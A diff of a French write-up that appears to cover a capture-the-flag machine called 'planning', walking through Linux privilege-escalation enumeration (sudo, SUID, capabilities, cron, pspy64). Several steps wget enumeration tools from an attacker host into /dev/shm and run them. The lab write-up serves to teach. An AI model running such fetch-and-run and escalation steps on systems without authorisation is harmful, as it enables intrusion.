@@ -230,14 +230,50 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 {{< escalade-intro user="ssh_user" >}}
 
+### Surveillance des processus avec pspy64
+
+Une autre vérification classique consiste à surveiller les processus exécutés sur la machine afin d’identifier d’éventuelles tâches automatiques lancées par `root`.
+
+Pour cela, tu ouvres une deuxième session SSH et tu utilises l’outil `pspy64`.
+
+Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’objectif est de lancer d’abord l’observation des tâches root puis de continuer l’énumération dans une autre session.
+
+Tu télécharges ensuite l’outil dans un répertoire accessible en écriture :
+
+```bash
+cd /dev/shm
+wget http://10.10.x.x:8000/pspy64
+chmod +x pspy64
+./pspy64
+```
+
+L’objectif est notamment de détecter :
+
+- des scripts exécutés automatiquement par `root`
+- des tâches cron personnalisées
+- des commandes exécutées périodiquement
+- des accès à des fichiers sensibles
+- des binaires exécutés avec des chemins relatifs
+
+Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’énumération afin d’observer d’éventuelles tâches exécutées automatiquement par `root`.
+
 ### Sudo -l
-Tu commences toujours par vérifier les droits sudo :
+
+Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :
+
+```
+ssh_user@planning:~$ sudo -l
+[sudo] password for ssh_user: 
+Sorry, user ssh_user may not run sudo on planning.
+```
+
+L’utilisateur `ssh_user` ne possède donc aucun droit sudo exploitable.
 
 ### Exploration du contexte utilisateur
 
 Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
 
-```bash
+```
 whoami
 id
 pwd
@@ -247,16 +283,33 @@ hostname
 
 Résultat :
 
+```
+ssh_user
+uid=1000(ssh_user) gid=1000(ssh_user) groups=1000(ssh_user)
+/home/ssh_user
+Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+planning
+```
+
+Cette étape permet notamment de confirmer :
+
+- l’utilisateur courant
+- les groupes associés
+- le noyau Linux utilisé
+- le nom de la machine
+- le répertoire de travail actuel
+
 ### Recherche de binaires SUID
+
 Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
 
-```bash
+```
 find / -perm -4000 -type f 2>/dev/null
 ```
 
 La liste obtenue ne contient que des binaires système classiques tels que :
 
-```texte
+```
 /usr/bin/passwd
 /usr/bin/chsh
 /usr/bin/chfn
@@ -265,8 +318,7 @@ La liste obtenue ne contient que des binaires système classiques tels que :
 ...
 ```
 
-Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
+Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.
 
 ### Analyse des Linux capabilities
 
@@ -274,63 +326,84 @@ Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, q
 
 La vérification se fait avec la commande suivante :
 
-```bash
+```
 getcap -r / 2>/dev/null
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+Résultat :
 
-### Vérification des SUID avec suid3num.py
+```
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+```
 
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
+Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.
 
-les binaires SUID intéressants
-leur présence éventuelle dans GTFOBins
+### Analyse complémentaire avec suid3num.py
 
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
+Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :
 
-```bash
+- les binaires SUID intéressants
+- leur présence éventuelle dans GTFOBins
+
+Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/dev/shm`) :
+
+```
 cd /dev/shm
 wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
+
+L’analyse confirme principalement la présence de binaires système classiques :
+
+```
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+...
+```
+
 L’outil confirme que :
 
 - tous les binaires SUID présents sont standards
 - aucun binaire personnalisé n’est identifié
 - aucun binaire exploitable via GTFOBins n’est détecté
-  
+
 Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
 
 ### Inspection des tâches cron
+
 Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
 
 Les crons système peuvent être consultés avec :
 
-```bash
+```
 cat /etc/crontab
 ```
 
+Résultat :
+
+```
+17 * * * * root cd / && run-parts --report /etc/cron.hourly
+25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+```
+
+Aucune tâche personnalisée ni script modifiable par l’utilisateur `ssh_user` n’apparaît ici.
+
 ### Analyse des services locaux
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
+
+Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.
 
 ```
 netstat -tulpn
 ```
 
-### pspy64
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
-
-Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
-
-cd /var/tmp
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
-
-L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
-
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+Résultat :
 
 ### Conclusion de l’énumération manuelle
 
